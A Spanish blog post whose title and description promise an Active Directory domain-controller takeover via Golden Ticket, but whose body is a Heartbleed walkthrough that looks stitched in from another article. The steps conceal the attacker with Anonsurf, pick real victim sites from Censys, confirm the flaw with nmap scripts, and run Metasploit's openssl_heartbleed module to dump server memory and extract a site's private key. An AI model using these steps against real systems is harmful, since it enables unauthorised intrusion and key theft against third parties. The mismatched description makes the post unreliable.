---
layout: single
title: Comprometiendo el controlador de dominio - Active Directory
excerpt: "De la Explotación Web al Control del Directorio: El Camino Completo para un Ataque Golden Ticket"
date: 2025-11-15
classes: wide
header:
  teaser: /assets/images/Active Directory/dc_1.png
  teaser_home_page: true
  icon: /assets/images/windows.webp
categories:
  - activedirectory
 
tags:  
  - activedirectory
  - goldenticket
  - impacket
  - ligolong
  - passthehash
  
---

![](/assets/images/Active%20Directory/dc.png)


## Descripción:

Este ejercicio simula un escenario de penetración en una infraestructura corporativa con una red altamente segmentada y una jerarquía de Active Directory (dominios Padre e Hijo). El ejercicio comienza con el acceso inicial a un sistema perimetral, para luego requerir el pivoteo de red a través de un túnel para acceder a la red interna y sus sistemas críticos. El objetivo final es la escalada de privilegios a nivel de dominio, aplicando técnicas de post-explotación como la extracción de credenciales (LSA Dump), el movimiento lateral (Pass the Hash), y el forjado de tickets de autenticación maestra para el control completo del Active Directory (Golden Ticket Attack).

## Explotaciòn:

Para esta explotaciòn vamos a utilizar una maquina con sistema operativo Kali Linux. Como primera medida vamos a iniciar el anunsurf para manejar el anonimato.

• Anonsurf start

![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01602.png)

Realizamos la búsqueda den Censys de un sitio vulnerable.

• https://censys.io/

![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01603.png)

Luego de detectar la dirección IP de una victima realizamos un escaneo con nmap vara validar si es vulnerable.

• nmap -p 443 --script = ssl-heartbleed <URL> para HEARTBLEED

• nmap -sV --version-light --script ssl-poodle -p 443 <URL> para POODLE

![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01604.png)

Utilizamos un modulo axuliar de metasploit, ingresamos la ip, puerto y seleccionamos modo DUMP para extraer información de la memoria del sitio., finalmente ejecutamos el exploit.

• msfconsole

• usar auxiliar / escáner / ssl / openssl_heartbleed msf auxiliar

• set RHOSTS <IP O URL VICTIMA>

• set RPORT 443

• set VERBOSE true

• set action DUMP

• exploit

![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01605.png)

Observamos que nos trae 65 Kb de información de la memoria del sitio.

![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01606.png)

Cambiamos el modo de ataque para que nos extraiga claves que tenga y lo ejecutamos de nuevo.

• set action KEYS

![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01607.png)


Finalmente bbtenemos la clave privada del sitio.

![](/assets/images/vulnerabilidades/cve-2014-0160/cve-2014-01608.png)

## Referencias:

• https://heartbleed.com/

• https://www.welivesecurity.com/la-es/2014/04/09/5-cosas-debes-saber-sobre-heartbleed/
